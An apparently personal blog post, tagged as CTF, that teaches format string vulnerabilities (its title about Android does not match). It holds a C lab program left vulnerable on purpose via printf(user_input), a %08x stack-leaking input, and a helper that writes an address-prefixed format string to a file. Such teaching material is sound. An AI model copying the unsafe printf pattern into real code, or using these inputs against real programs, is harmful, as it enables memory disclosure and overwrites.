---
layout: ctf
title: "learn android by game"
date: 2014-07-11 19:00:00
categories: ctf
---
#1. About format_string_vulnerability
	
	1. The Format String exploit occurs when the submitted data of an input string is evaluated as a command by the application. In this way, the attacker could execute code, read the stack, or cause a segmentation fault in the running application, causing new behaviors that could compromise the security or the stability of the system.
	2. The attack could be executed when the application doesnâ€™t properly validate the submitted input. In this case, if a Format String parameter, like %x, is inserted into the posted data, the string is parsed by the Format Function, and the conversion specified in the parameters is executed. However, the Format Function is expecting more arguments as input, and if these arguments are not supplied, the function could read or write the stack.In this way, it is possible to define a well-crafted input that could change the behavior of the format function, permitting the attacker to cause denial of service or to execute arbitrary commands.
#2. Related function and parameter
##2.1. format string output functions:


format fuction | description
 :------------: | :--------------:
   fprintf       | write the printf to a file
   printf | output a formatted string
   sprintf | prints to a string
   snprintf | prints into a string checking the length
   vfprintf | prints the va_arg strcture to a file
   vprintf | prints the va_arg strucure to stdout
   vsprintf | prints the va_arg to a string
   vsnprintf | prints the va_arg to a string checking the length
   

##2.2. Common string format parameters

parameters | output | passed as
:---------: | :------:| :-----:
%p | external representation of a pointer to void | reference
%d | decimal | value
%c | character | value
%u | unsigned decimal | value
%x | hexadecimal | value
%s | string | reference
%n | writes the number of characters into a pointer | reference

#3. experiment
##3.1 stack test when function call
original : <http://blog.csdn.net/feng_zh/article/details/7075986>

code: test_printf(32 bit linux os)

	.section .data
        format: .asciz "%d\n"
	.section .text
	.global _start
	_start:
        pushl $12
        pushl $format
        call printf
        movl $0, (%esp)
        call exit
        
compile and link:

    as -g test_printf.s -o test_printf.o
    ld -lc -I /lib/ld-linux.so.2 test_printf.o -o test_printf
    
    #as -g for debug #ld -lc to link libc.a # ld -I to dynamic link /lib/ld-linux.so.2
    
objdump and gdb

	objdump -d test_printf 
	gdb test_printf
	b start
	run
	s #single step run
	info reg
	x/40 $SP
	
	
##3.2 format string vulnerablity test
original : <http://blog.sina.com.cn/s/blog_70dd16910100qfuh.html>

code: vul_program.c (32 bit linux os)

	#define SECRET1 0x44
	#define SECRET2 0x55
 
	int main(int argc, char *argv[])
	{
	  char user_input[100];
	  int *secret;
	  int int_input;
	  int a, b, c, d; //other variables, not used here.
	 
	  // The secret value is stored on the heap
	  secret = (int *) malloc(2*sizeof(int));
	 
	  // getting the secret
	  secret[0] = SECRET1; secret[1] = SECRET2;
	 
	  printf("The variable secret's address is 0x%8x (on stack)\n", &secret);
	  printf("The variable secret's value is 0x%8x (on heap)\n", secret);
	  printf("secret[0]'s address is 0x%8x (on heap)\n", &secret[0]);
	  printf("secret[1]'s address is 0x%8x (on heap)\n", &secret[1]);
	 
	  printf("Please enter a decimal integer\n");
	  scanf("%d", &int_input);  // getting an input from user
	  printf("Please enter a string\n");
	  scanf("%s", user_input); // getting a string from user
	 
	  // Vulnerable place
	  printf(user_input); 
	  printf("\n");
	 
	  // Verify whether your attack is successful
	  printf("The original secrets: 0x%x -- 0x%x\n", SECRET1, SECRET2);
	  printf("The new secrets:      0x%x -- 0x%x\n", secret[0], secret[1]);
	  return 0;
	}
	
compile

	gcc vul_program.c -o vul_program
	
test

	./vul_program
	input 1 as test
	input string %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
	
notes:

	when ASLR closed no int_input required, we can construct the string to specific address.
	useful string construct code:
	contruct_mystring.c
	#include <sys/types.h>
	#include <sys/stat.h>
	#include <fcntl.h>
	 
	int main()
	{
	       char buf[1000];
	       int fp, size;
	       unsigned int *address;
	// Putting any number you like at the beginning of your format string
	       address  = (unsigned int *) buf;
	       *address = 0x22080;
	//Geting the rest of the format string
	       scanf("%s", buf+4);
	       size = strlen(buf+4) + 4;
	       printf("The string length is %d\n", size);
	 
	//Writing buf to "mystring"
	       fp = open("mystring", O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR);
	       if(fp !=-1)
	       {
	              write(fp, buf, size);
	              close(fp);
	       }
	       else
	       {
	              printf("Open failed!\n");
	       }
	       return 0;
	}

#reference
1. <https://www.owasp.org/index.php/Format_string_attack>
2. <http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf>